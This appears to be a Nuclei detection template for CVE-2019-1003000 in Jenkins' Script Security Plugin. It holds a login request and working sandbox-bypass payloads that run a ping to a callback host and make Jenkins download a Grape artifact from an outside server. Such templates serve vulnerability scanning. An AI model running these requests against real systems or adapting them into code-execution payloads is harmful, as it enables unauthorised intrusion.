flow: http(1,2) && (http(3) || http(4))
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - Jenkins
    - name="j_username"
    - name="j_password"
  matchers-condition: and
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body_2, "/logout")
    - contains(body_2, "[Jenkins]</title>")
    internal: true
    type: dsl
  raw:
  - 'POST /j_acegi_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    j_username={{username}}&j_password={{password}}&from=%2F&Submit=Sign+in

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - 'GET /securityRealm/user/{{to_lower(username)}}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20{{app_name}}{public%20{{app_name}}(){%22ping%20-c%202%20{{interactsh-url}}%22.execute()}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /securityRealm/user/{{to_lower(username)}}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20{{app_name}}{public%20{{app_name}}(){%22ping%20-n%202%20{{interactsh-url}}%22.execute()}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - /{{replace(vendor_name, '.', '/')}}/{{app_name}}/1/{{app_name}}-1.pom
  matchers-condition: and
  raw:
  - 'GET /securityRealm/user/{{to_lower(username)}}/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(%27http%3a%2f%2f{{interactsh-url}}%2f%27)%0a@Grab(%27{{vendor_name}}:{{app_name}}:1%27)%0aimport%20{{app_name}};
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2019-1003000
info:
  author: sttlr
  classification:
    cpe: cpe:2.3:a:jenkins:script_security::::::jenkins::*
    cve-id: CVE-2019-1003000
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
  description: 'A sandbox bypass vulnerability exists in the Jenkins Script Security
    Plugin (versions 1.49 and earlier) within src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java.
    This flaw allows attackers with permission to submit sandboxed scripts to execute
    arbitrary code on the Jenkins master JVM, potentially compromising the entire
    Jenkins environment.

    '
  metadata:
    product: script_security
    vendor: jenkins
  name: Jenkins Script Security Plugin - Sandbox Bypass
  reference:
  - https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266
  - http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_metaprogramming
  - https://github.com/slowmistio/CVE-2019-1003000-and-CVE-2018-1999002-Pre-Auth-RCE-Jenkins
  - https://github.com/1NTheKut/CVE-2019-1003000_RCE-DETECTION
  - https://github.com/purple-WL/Jenkins_CVE-2019-1003000
  - https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
  severity: high
  tags: cve,cve2019,jenkins,code
variables:
  app_name: '{{rand_text_alpha(8)}}'
  username: admin
  vendor_name: '{{rand_text_alpha(3)}}.{{rand_text_alpha(5)}}'
